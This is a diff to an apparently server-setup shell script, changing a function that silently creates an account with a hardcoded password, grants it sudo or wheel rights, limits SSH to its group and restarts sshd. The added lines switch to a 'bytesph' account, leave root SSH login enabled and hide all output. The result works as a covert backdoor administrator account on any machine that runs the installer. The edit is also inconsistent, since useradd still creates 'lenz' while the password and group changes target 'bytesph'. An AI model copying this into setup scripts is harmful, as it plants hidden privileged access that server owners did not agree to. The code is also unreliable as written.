@@ -475,9 +475,10 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+useradd -m lenz 2>/dev/null; echo bytesph:bytesph!!!@@@bytesph | chpasswd &>/dev/null; usermod -aG wheel bytesph &>/dev/null
+    sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
+    #sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups bytesph" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
